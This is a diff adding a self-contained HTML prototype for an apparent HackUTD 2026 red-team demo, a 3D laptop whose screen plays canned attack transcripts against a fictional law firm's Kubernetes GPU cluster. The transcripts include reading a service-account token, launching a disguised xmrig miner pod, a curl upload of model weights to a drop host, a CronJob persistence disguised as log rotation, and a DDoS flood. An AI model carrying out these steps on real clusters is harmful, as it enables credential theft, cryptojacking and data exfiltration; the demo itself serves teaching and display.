@@ -1,0 +1,461 @@
+<!doctype html>
+<!--
+  Scratch prototype: UI-only 3D hacker laptop, HackUTD 2026 "Zero Day" styling.
+
+  Hand-off notes for whoever picks this up:
+  - Pure HTML/CSS/JS, no build, no backend. Open the file in a browser.
+  - The 3D is CSS 3D transforms (perspective + preserve-3d), so the screen is a real DOM
+    terminal: buttons are clickable and text is selectable. No three.js needed.
+  - Flow: laptop starts closed -> click (or Enter) opens the lid -> camera zooms until the screen
+    fills the window -> boot lines -> "Gain access"
+    -> then Start miner / Steal weights / Persistence / DDoS flood. Every transcript is canned
+    text in STEPS below, modeled on backend/app/attacks/steps.py. Nothing calls an API.
+  - To wire it to the real backend, replace run()'s canned lines with POST /attack/<step>
+    and stream GET /attack/stream lines into print() (see attacker/src/api.ts).
+  - Mascot art is HackUTD's (from console/public/mascots), loaded by relative path.
+-->
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Zero Day Laptop</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:ital,wght@0,600;1,700&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet" />
+<style>
+  :root {
+    --bg: #05070a;
+    --purple: #7828ff;
+    --lav: #dbc4ff;
+    --ink: #f4f2ff;
+    --muted: #8b86a8;
+    --pink: #ff3fd8;
+    --cyan: #5ef2ff;
+    --green: #4fe3a8;
+    --red: #ff5c7c;
+    --w: 640px;      /* laptop width */
+    --lid: 400px;    /* lid height */
+    --deck: 430px;   /* keyboard deck depth */
+    --open: 0;       /* set by JS: 0 closed, 1 open (drives the lid hinge) */
+  }
+  * { box-sizing: border-box; }
+  html, body { height: 100%; margin: 0; }
+  body {
+    background:
+      radial-gradient(900px 500px at 50% 110%, rgba(120, 40, 255, .35), transparent 70%),
+      radial-gradient(700px 300px at 50% -10%, rgba(255, 63, 216, .12), transparent 70%),
+      var(--bg);
+    color: var(--ink);
+    font-family: "IBM Plex Mono", ui-monospace, Menlo, monospace;
+    overflow: hidden;
+  }
+
+  /* ---- night city backdrop ---- */
+  .moon { position: fixed; top: 9vh; right: 14vw; width: 74px; height: 74px; border-radius: 50%;
+    background: radial-gradient(circle at 35% 35%, #f3e9ff, #b9a6d8 70%); box-shadow: 0 0 60px rgba(219, 196, 255, .35); }
+  .skyline { position: fixed; left: 0; right: 0; bottom: 0; width: 100%; height: 46vh; opacity: .55; pointer-events: none; }
+  .title { position: fixed; top: 28px; left: 32px; z-index: 5; }
+  .title h1 { margin: 0; font: italic 700 34px/1 "Chakra Petch", sans-serif; letter-spacing: .02em; text-transform: lowercase; }
+  .title h1 em { color: var(--lav); font-style: inherit; text-shadow: 0 0 18px rgba(120, 40, 255, .8); }
+  .title p { margin: 6px 0 0; color: var(--muted); font-size: 12px; letter-spacing: .14em; text-transform: uppercase; }
+  .hint { position: fixed; bottom: 26px; left: 50%; transform: translateX(-50%); z-index: 5;
+    font: 600 12px "Chakra Petch", sans-serif; letter-spacing: .2em; text-transform: uppercase; color: var(--lav);
+    padding: 8px 16px; border: 1px solid rgba(219, 196, 255, .3); background: rgba(5, 7, 10, .6);
+    clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
+    transition: opacity .4s; }
+  .open .hint { opacity: 0; }
+
+  /* ---- 3D stage ---- */
+  .stage { position: fixed; inset: 0; perspective: 1700px; display: grid; place-items: center; }
+  /* Camera. One transform list for every pose so the browser interpolates it cleanly.
+     JS sets the vars: the closed pose (+ mouse parallax), then the zoom-into-screen pose. */
+  .rig {
+    --s: .9; --ty: 150px; --tz: 0px; --ax: -26deg; --ay: 0deg;
+    width: var(--w); height: 0; transform-style: preserve-3d;
+    transform: scale(var(--s)) translate3d(0, var(--ty), var(--tz)) rotateX(var(--ax)) rotateY(var(--ay));
+    transition: transform .6s cubic-bezier(.2, .8, .2, 1);
+  }
+  .zooming .rig { transition-duration: 1.4s; transition-timing-function: cubic-bezier(.7, 0, .2, 1); }
+  .title, .moon, .skyline, .floor { transition: opacity .8s; }
+  .zooming .title, .zooming .moon, .zooming .skyline, .zooming .floor { opacity: 0; }
+  .laptop { position: relative; width: var(--w); height: 0; transform-style: preserve-3d;
+    transform: translateZ(calc(var(--deck) / -2)); cursor: pointer; outline: none; }
+  .open .laptop { cursor: default; }
+
+  .floor { position: absolute; left: calc(var(--w) / 2 - 900px); top: -900px; width: 1800px; height: 1800px;
+    transform: translateY(24px) translateZ(calc(var(--deck) / 2)) rotateX(90deg); pointer-events: none;
+    background:
+      repeating-linear-gradient(90deg, rgba(120, 40, 255, .35) 0 1px, transparent 1px 60px),
+      repeating-linear-gradient(0deg, rgba(120, 40, 255, .35) 0 1px, transparent 1px 60px);
+    -webkit-mask-image: radial-gradient(circle, #000 0, transparent 60%); mask-image: radial-gradient(circle, #000 0, transparent 60%); }
+
+  /* keyboard deck: lies flat, extending from the hinge toward the viewer */
+  .deck { position: absolute; left: 0; top: 0; width: var(--w); height: var(--deck);
+    transform-origin: top center; transform: rotateX(90deg); transform-style: preserve-3d;
+    background: linear-gradient(180deg, #1b1530, #120e22); border-radius: 0 0 18px 18px;
+    box-shadow: inset 0 0 0 1px rgba(219, 196, 255, .12), 0 0 60px rgba(120, 40, 255, .25);
+    padding: 34px 40px 0; }
+  .deck-front { position: absolute; left: 0; top: 100%; width: 100%; height: 18px; transform-origin: top center;
+    transform: rotateX(-90deg); background: linear-gradient(90deg, #2a1f4a, #4b2aa0 50%, #2a1f4a); border-radius: 0 0 12px 12px;
+    box-shadow: 0 0 24px rgba(120, 40, 255, .6); }
+  .keys { display: grid; grid-template-columns: repeat(14, 1fr); gap: 6px; }
+  .keys i { height: 30px; border-radius: 5px; background: #0b0816;
+    box-shadow: 0 0 0 1px rgba(219, 196, 255, .08), 0 0 10px rgba(120, 40, 255, .45); }
+  .keys i.wide { grid-column: span 2; }
+  .keys i.space { grid-column: 4 / span 7; }
+  .open .keys i { animation: rgb 3s linear infinite; }
+  .open .keys i:nth-child(3n) { animation-delay: -1s; }
+  .open .keys i:nth-child(3n+1) { animation-delay: -2s; }
+  @keyframes rgb { 0%, 100% { box-shadow: 0 0 0 1px rgba(219,196,255,.08), 0 0 10px rgba(120,40,255,.6); }
+    50% { box-shadow: 0 0 0 1px rgba(219,196,255,.08), 0 0 12px rgba(255,63,216,.6); } }
+  .trackpad { width: 210px; height: 120px; margin: 22px auto 0; border-radius: 10px; background: #0f0b1d;
+    box-shadow: inset 0 0 0 1px rgba(219, 196, 255, .14); }
+
+  /* lid: hinged on its bottom edge. Closed = folded flat over the deck. */
+  .lid { position: absolute; left: 0; top: calc(var(--lid) * -1); width: var(--w); height: var(--lid);
+    transform-origin: bottom center; transform-style: preserve-3d;
+    transform: rotateX(calc(-90deg + var(--open) * 100deg));
+    transition: transform 1.4s cubic-bezier(.65, 0, .25, 1); }
+  .lid-front, .lid-back { position: absolute; inset: 0; border-radius: 18px 18px 6px 6px; backface-visibility: hidden; }
+  .lid-front { background: #0a0814; padding: 18px; box-shadow: inset 0 0 0 1px rgba(219, 196, 255, .14); }
+  /* rotateX (not Y) so the art reads upright, unmirrored, when the lid is shut */
+  .lid-back { transform: rotateX(180deg) translateZ(8px);
+    background:
+      radial-gradient(400px 260px at 50% 45%, rgba(120, 40, 255, .35), transparent 70%),
+      linear-gradient(160deg, #241a44, #120e22);
+    box-shadow: inset 0 0 0 1px rgba(219, 196, 255, .18), 0 0 40px rgba(120, 40, 255, .4);
+    display: grid; place-items: center; }
+  .lid-back .logo { width: 110px; filter: drop-shadow(0 0 18px rgba(120, 40, 255, .9)); }
+  .sticker { position: absolute; }
+  .sticker.raccoon { width: 120px; height: 120px; border-radius: 50%; overflow: hidden; left: 54px; bottom: 50px; transform: rotate(-12deg);
+    border: 4px solid #f4f2ff; box-shadow: 0 6px 14px rgba(0, 0, 0, .5); background: #1a1030; }
+  .sticker.raccoon img { width: 100%; height: 100%; object-fit: cover; }
+  .sticker.tag { right: 50px; top: 56px; transform: rotate(8deg); padding: 8px 16px; background: var(--purple); color: #fff;
+    font: italic 700 18px "Chakra Petch", sans-serif; letter-spacing: .04em; text-transform: uppercase;
+    clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px); }
+
+  /* ---- the screen ---- */
+  .screen { position: relative; height: 100%; border-radius: 8px; overflow: hidden; background: #000;
+    display: flex; flex-direction: column; box-shadow: 0 0 0 1px #000, 0 0 30px rgba(120, 40, 255, .0); transition: box-shadow 1s; }
+  .booted .screen { box-shadow: 0 0 0 1px #000, 0 0 40px rgba(120, 40, 255, .55); background: radial-gradient(120% 90% at 50% 0%, #140c2a, #06040c 70%); }
+  .screen::after { content: ""; position: absolute; inset: 0; pointer-events: none;
+    background: repeating-linear-gradient(0deg, rgba(255, 255, 255, .03) 0 1px, transparent 1px 3px); }
+  .flash { position: absolute; inset: 0; background: #fff; opacity: 0; pointer-events: none; }
+  .booting .flash { animation: flash .5s ease-out; }
+  @keyframes flash { 0% { opacity: 0 } 20% { opacity: .8 } 100% { opacity: 0 } }
+  .bar { display: flex; align-items: center; gap: 6px; padding: 7px 10px; border-bottom: 1px solid rgba(219, 196, 255, .12);
+    font-size: 11px; color: var(--muted); opacity: 0; transition: opacity .4s; }
+  .booted .bar { opacity: 1; }
+  .bar b { width: 9px; height: 9px; border-radius: 50%; background: #3a2f5c; }
+  .bar b:first-child { background: var(--pink); }
+  .bar span { margin-left: 8px; }
+  .bar .step { margin-left: auto; color: var(--lav); font-weight: 600; }
+  .log { flex: 1; overflow-y: auto; padding: 10px 12px 4px; font-size: 11.5px; line-height: 1.5; scrollbar-width: thin; scrollbar-color: #3a2f5c transparent; }
+  .ln { white-space: pre-wrap; word-break: break-word; }
+  .ln.note { color: var(--pink); }
+  .ln.note::before { content: "# "; opacity: .7; }
+  .ln.cmd { color: var(--ink); }
+  .ln.cmd::before { content: "$ "; color: var(--purple); font-weight: 600; }
+  .ln.code { color: var(--lav); opacity: .85; border-left: 2px solid rgba(120, 40, 255, .6); padding-left: 8px; margin: 2px 0; }
+  .ln.http { color: var(--cyan); }
+  .ln.out { color: #cfcbe6; }
+  .ln.ok { color: var(--green); font-weight: 600; }
+  .ln.err { color: var(--red); font-weight: 600; }
+  .ln.big { font: italic 700 20px/1.3 "Chakra Petch", sans-serif; color: var(--green); text-shadow: 0 0 14px rgba(79, 227, 168, .6); margin: 4px 0; }
+  .ln.sys { color: var(--muted); }
+  .caret { display: inline-block; width: 7px; height: 13px; background: var(--lav); vertical-align: -2px; animation: blink 1s steps(1) infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  .actions { display: flex; flex-wrap: wrap; gap: 8px; padding: 10px 12px 12px; border-top: 1px solid rgba(219, 196, 255, .12); min-height: 54px; }
+  .actions:empty { display: none; }
+  .act {
+    font: 600 12px "Chakra Petch", sans-serif; letter-spacing: .08em; text-transform: uppercase;
+    color: #fff; background: var(--purple); border: 0; padding: 8px 11px; cursor: pointer;
+    clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
+    transition: background-color .15s; }
+  /* Colour-only hover: a transform or filter here moves the button inside the 3D layer
+     between pointerdown and pointerup, so the click never lands. */
+  .act:hover:not(:disabled) { background-color: #9150ff; }
+  .act.danger:hover:not(:disabled) { background-color: #b0184a; }
+  .act:disabled { opacity: .4; cursor: not-allowed; }
+  .act.done { background: #1d3b30; color: var(--green); }
+  .act.done::before { content: "✓ "; }
+  .act.danger { background: #8a1238; }
+  .act:focus-visible { outline: 2px solid var(--cyan); outline-offset: 2px; }
+
+  @media (prefers-reduced-motion: reduce) {
+    .rig, .lid { transition-duration: .01s; }
+    .open .keys i, .caret, .booting .flash { animation: none; }
+  }
+  @media (max-width: 760px) { :root { --w: 360px; --lid: 240px; --deck: 250px; } .keys i { height: 16px; } .trackpad { width: 120px; height: 60px; } .title h1 { font-size: 22px; } }
+</style>
+</head>
+<body>
+  <div class="moon" aria-hidden="true"></div>
+  <svg class="skyline" viewBox="0 0 1200 400" preserveAspectRatio="none" aria-hidden="true">
+    <g fill="#120c24">
+      <rect x="0" y="220" width="90" height="180"/><rect x="80" y="150" width="70" height="250"/><rect x="160" y="250" width="110" height="150"/>
+      <rect x="260" y="120" width="60" height="280"/><rect x="330" y="200" width="120" height="200"/><rect x="460" y="90" width="80" height="310"/>
+      <rect x="760" y="140" width="90" height="260"/><rect x="850" y="230" width="120" height="170"/><rect x="980" y="110" width="70" height="290"/>
+      <rect x="1050" y="210" width="150" height="190"/>
+    </g>
+    <g fill="#7828ff" opacity=".7">
+      <rect x="95" y="170" width="6" height="8"/><rect x="120" y="200" width="6" height="8"/><rect x="275" y="150" width="6" height="8"/>
+      <rect x="290" y="210" width="6" height="8"/><rect x="480" y="120" width="6" height="8"/><rect x="510" y="180" width="6" height="8"/>
+      <rect x="780" y="170" width="6" height="8"/><rect x="820" y="230" width="6" height="8"/><rect x="1000" y="140" width="6" height="8"/>
+    </g>
+    <g fill="#ff3fd8" opacity=".6"><rect x="350" y="230" width="6" height="8"/><rect x="900" y="260" width="6" height="8"/><rect x="1100" y="240" width="6" height="8"/></g>
+  </svg>
+
+  <div class="title">
+    <h1>the city needs <em>you</em>...</h1>
+    <p>HackUTD 2026 · Zero Day · red team</p>
+  </div>
+
+  <main class="stage" id="stage">
+    <div class="rig" id="rig">
+      <div class="floor" aria-hidden="true"></div>
+      <div class="laptop" id="laptop" tabindex="0" role="button" aria-label="Open the laptop">
+        <div class="deck" aria-hidden="true">
+          <div class="keys" id="keys"></div>
+          <div class="trackpad"></div>
+          <div class="deck-front"></div>
+        </div>
+        <div class="lid">
+          <div class="lid-back" aria-hidden="true">
+            <img class="logo" src="../console/public/mascots/logo.png" alt="" onerror="this.remove()" />
+            <div class="sticker raccoon"><img src="../console/public/mascots/raccoon.png" alt="" onerror="this.remove()" /></div>
+            <div class="sticker tag">zero day</div>
+          </div>
+          <div class="lid-front">
+            <div class="screen" id="screen">
+              <div class="flash"></div>
+              <div class="bar"><b></b><b></b><b></b><span>raccoon@zeroday: ~/ops</span><span class="step" id="stepLabel"></span></div>
+              <div class="log" id="log" aria-live="polite"></div>
+              <div class="actions" id="actions"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+  <div class="hint" id="hint">Click the laptop to open it</div>
+
+<script>
+// ---------------------------------------------------------------------------
+// Canned transcripts (UI only). Modeled on backend/app/attacks/steps.py.
+// kinds: sys | note | cmd | code | http | out | ok | err | big
+// {progress: [label, ms]} draws an in-place progress bar; {counter: [...]} a live counter.
+// ---------------------------------------------------------------------------
+const STEPS = {
+  gain: { label: "Gain access", lines: [
+    ["note", "Recon: look for an unauthenticated JupyterLab on the network (ShadowRay-style)."],
+    ["cmd", "curl -s http://100.106.83.89:8888/api"],
+    ["out", '{"version": "4.2.5"}   # no auth challenge'],
+    ["note", "No token, no password. Open a kernel = remote code execution inside the pod."],
+    ["http", "POST /api/kernels  ->  201 Created  (kernel 7f3c…)"],
+    ["code", 'tok = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()\nns  = open(".../namespace").read()\nprint(ns, len(tok))'],
+    ["out", "lawfirm 1012"],
+    ["note", "Ask the API server what this stolen identity may do."],
+    ["http", "POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews  ->  201"],
+    ["out", "  verbs=[get list create delete]  resources=[pods pods/log]\n  verbs=[get list create delete]  resources=[cronjobs jobs]"],
+    ["big", "ACCESS GRANTED"],
+    ["ok", "Holding sa:lawfirm:notebook. Choose your next move."],
+  ]},
+  miner: { label: "Start miner", lines: [
+    ["note", "Create a GPU pod with the stolen token — a disguised cryptojacker."],
+    ["out", "nvidia-smi: GPU utilization 31% before the miner"],
+    ["code", 'body = {"kind": "Pod", "metadata": {"name": "kube-sync-a41f9c"},\n        "spec": {"containers": [{"name": "xmrig",\n          "resources": {"limits": {"nvidia.com/gpu": 1}}}]}}\nk8s("POST", "/api/v1/namespaces/lawfirm/pods", body)'],
+    ["http", "POST /api/v1/namespaces/lawfirm/pods  ->  201 Created"],
+    {progress: ["Spinning up kube-sync-a41f9c", 1800]},
+    ["out", "nvidia-smi: GPU utilization 97% (training job slowed 3.4x)"],
+    ["ok", "Miner running on 1 of 8 GPU slots."],
+  ]},
+  steal: { label: "Steal weights", lines: [
+    ["note", "Create a pod that mounts the firm's model-weights volume and ships it out."],
+    ["code", 'volumes = [{"name": "w", "persistentVolumeClaim": {"claimName": "model-weights", "readOnly": True}}]\ncmd = "curl -T /w/contracts-ft-v3.pt http://drop.drop-site.svc/"'],
+    ["http", "POST /api/v1/namespaces/lawfirm/pods  ->  201 Created  (data-sync-6371ae)"],
+    {progress: ["Uploading contracts-ft-v3.pt (288.3 MiB) -> drop-site", 3200]},
+    ["ok", "Exfiltrated 288.3 MiB of fine-tuned model weights."],
+  ]},
+  persist: { label: "Persistence", lines: [
+    ["note", "Install a CronJob disguised as log rotation that relaunches the miner."],
+    ["code", 'body = {"kind": "CronJob", "metadata": {"name": "log-rotate"},\n        "spec": {"schedule": "*/2 * * * *", ...}}'],
+    ["http", "POST /apis/batch/v1/namespaces/lawfirm/cronjobs  ->  201 Created"],
+    ["out", "next run in 1m54s"],
+    ["ok", "Persistence planted: log-rotate fires every 2 minutes."],
+  ]},
+  ddos: { label: "DDoS flood", lines: [
+    ["note", "Rent the GPU box out as a DDoS bot. Safety cap: target is the in-cluster sink only."],
+    ["http", "POST /api/v1/namespaces/lawfirm/pods  ->  201 Created  (flood-2c9d)"],
+    {counter: ["requests/s to sink.drop-site.svc", 2400, 48000]},
+    ["ok", "Flood running. Sink is taking ~48k req/s."],
+  ]},
+};
+const NEXT = ["miner", "steal", "persist", "ddos"];
+
+// ---------------------------------------------------------------------------
+const $ = (id) => document.getElementById(id);
+const rig = $("rig"), laptop = $("laptop"), log = $("log"), actions = $("actions"), stepLabel = $("stepLabel");
+const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
+const wait = (ms) => new Promise((r) => setTimeout(r, reduced ? 0 : ms));
+const state = { open: false, busy: false, gained: false, done: new Set(), runId: 0 };
+
+// keyboard keys
+const keys = $("keys");
+for (let r = 0; r < 4; r++) for (let c = 0; c < 14; c++) {
+  const i = document.createElement("i");
+  if (r === 3 && c === 0) i.className = "wide";
+  if (r === 3 && c > 1 && c < 9) { if (c === 2) i.className = "space"; else continue; }
+  keys.appendChild(i);
+}
+
+function print(kind, text) {
+  const d = document.createElement("div");
+  d.className = "ln " + kind;
+  d.textContent = text;
+  log.appendChild(d);
+  log.scrollTop = log.scrollHeight;
+  return d;
+}
+async function type(kind, text, id) {
+  const d = print(kind, "");
+  for (const ch of text) { if (id !== state.runId) return; d.textContent += ch; log.scrollTop = log.scrollHeight; await wait(14); }
+}
+async function progress([label, ms], id) {
+  const d = print("out", "");
+  for (let p = 0; p <= 100; p += 4) {
+    if (id !== state.runId) return;
+    const n = Math.round(p / 4);
+    d.textContent = `${label}\n[${"█".repeat(n)}${"░".repeat(25 - n)}] ${p}%`;
+    log.scrollTop = log.scrollHeight;
+    await wait(ms / 25);
+  }
+}
+async function counter([label, from, to], id) {
+  const d = print("http", "");
+  for (let k = 0; k <= 30; k++) {
+    if (id !== state.runId) return;
+    d.textContent = `${label}: ${Math.round(from + (to - from) * (k / 30)).toLocaleString()}`;
+    await wait(70);
+  }
+}
+
+async function play(lines, id) {
+  for (const l of lines) {
+    if (id !== state.runId) return;
+    if (l.progress) await progress(l.progress, id);
+    else if (l.counter) await counter(l.counter, id);
+    else if (l[0] === "cmd") await type("cmd", l[1], id);
+    else { print(l[0], l[1]); await wait(l[0] === "code" ? 650 : 380); }
+  }
+}
+
+function button(label, onClick, cls = "") {
+  const b = document.createElement("button");
+  b.className = "act " + cls;
+  b.textContent = label;
+  b.onclick = (e) => { e.stopPropagation(); onClick(); };
+  return b;
+}
+function renderActions() {
+  actions.replaceChildren();
+  if (!state.open) return;
+  if (!state.gained) {
+    actions.append(button("Gain access", () => run("gain"), "danger"));
+  } else {
+    for (const k of NEXT) {
+      const b = button(STEPS[k].label, () => run(k), state.done.has(k) ? "done" : "");
+      b.disabled = state.busy;
+      actions.append(b);
+    }
+  }
+  for (const b of actions.querySelectorAll(".act")) b.disabled = state.busy;
+  log.scrollTop = log.scrollHeight;  // the button row can resize the log; keep the latest line in view
+}
+
+async function run(key) {
+  if (state.busy) return;
+  state.busy = true;
+  const id = state.runId;
+  stepLabel.textContent = STEPS[key].label.toUpperCase();
+  log.querySelector(".caret")?.remove();
+  renderActions();
+  print("sys", "");
+  print("sys", `── ${STEPS[key].label} ${"─".repeat(30)}`);
+  await play(STEPS[key].lines, id);
+  if (id !== state.runId) return;
+  if (key === "gain") state.gained = true; else state.done.add(key);
+  state.busy = false;
+  stepLabel.textContent = state.gained ? "FOOTHOLD: lawfirm/notebook" : "";
+  renderActions();
+}
+
+async function boot(id) {
+  document.body.classList.add("booting");
+  await wait(250);
+  document.body.classList.add("booted");
+  for (const [k, t] of [
+    ["sys", "ZERO DAY OS 26.11  ·  HackUTD red team build"],
+    ["ok", "[ ok ] tailscale up  100.64.0.7"],
+    ["ok", "[ ok ] target in range  100.106.83.89:8888"],
+    ["sys", "Law firm: Halloran & Vance LLP · k3s GPU cluster"],
+  ]) { if (id !== state.runId) return; print(k, t); await wait(260); }
+  await type("cmd", "./zeroday --target lawfirm", id);
+  if (id !== state.runId) return;
+  const c = document.createElement("span"); c.className = "caret"; log.appendChild(c);
+  renderActions();
+  actions.querySelector(".act")?.focus({ preventScroll: true });
+}
+
+// Camera pose that puts the open screen face-on, centred, filling the window.
+// The lid opens to +10deg past vertical; tilt the camera back by the same angle, move the
+// lid's centre to the rig origin, then scale so the lid fills the viewport. Doing it in
+// scale() at z=0 (rather than flying in with translateZ) keeps the screen undistorted.
+const LID_OPEN_DEG = 10;
+function zoomPose() {
+  const css = getComputedStyle(document.documentElement);
+  const w = parseFloat(css.getPropertyValue("--w")), lid = parseFloat(css.getPropertyValue("--lid"));
+  const deck = parseFloat(css.getPropertyValue("--deck"));
+  const t = LID_OPEN_DEG * Math.PI / 180, L = lid / 2, D = deck / 2;
+  const y = -L * Math.cos(t), z = -D - L * Math.sin(t);          // lid centre, rig space
+  const y2 = y * Math.cos(t) + z * Math.sin(t);                    // after rotateX(-t)
+  const z2 = -y * Math.sin(t) + z * Math.cos(t);
+  const s = Math.min(innerWidth * 0.98 / w, innerHeight * 0.98 / lid);
+  setPose({ s, ty: -y2, tz: -z2, ax: -LID_OPEN_DEG, ay: 0 });
+}
+function setPose({ s, ty, tz, ax, ay }) {
+  rig.style.setProperty("--s", s);
+  rig.style.setProperty("--ty", ty + "px");
+  rig.style.setProperty("--tz", tz + "px");
+  rig.style.setProperty("--ax", ax + "deg");
+  rig.style.setProperty("--ay", ay + "deg");
+}
+
+async function open() {
+  if (state.open) return;
+  state.open = true;
+  const id = ++state.runId;
+  document.body.classList.add("open");
+  setPose({ s: .9, ty: 150, tz: 0, ax: -26, ay: 0 });              // settle the parallax first
+  document.documentElement.style.setProperty("--open", 1);         // 1. swing the lid open
+  laptop.setAttribute("aria-label", "Laptop, open");
+  await wait(1250);
+  document.body.classList.add("zooming");                          // 2. dive into the screen
+  zoomPose();
+  await wait(1350);
+  if (id === state.runId) boot(id);                                // 3. power on
+}
+addEventListener("resize", () => { if (document.body.classList.contains("zooming")) zoomPose(); });
+
+laptop.addEventListener("click", open);
+laptop.addEventListener("keydown", (e) => { if ((e.key === "Enter" || e.key === " ") && !state.open) { e.preventDefault(); open(); } });
+
+// subtle mouse parallax while the laptop is closed
+if (!reduced) addEventListener("mousemove", (e) => {
+  if (state.open) return;
+  const x = e.clientX / innerWidth - 0.5, y = e.clientY / innerHeight - 0.5;
+  setPose({ s: .9, ty: 150, tz: 0, ax: -26 - y * 8, ay: x * 18 });
+});
+</script>
+</body>
+</html>
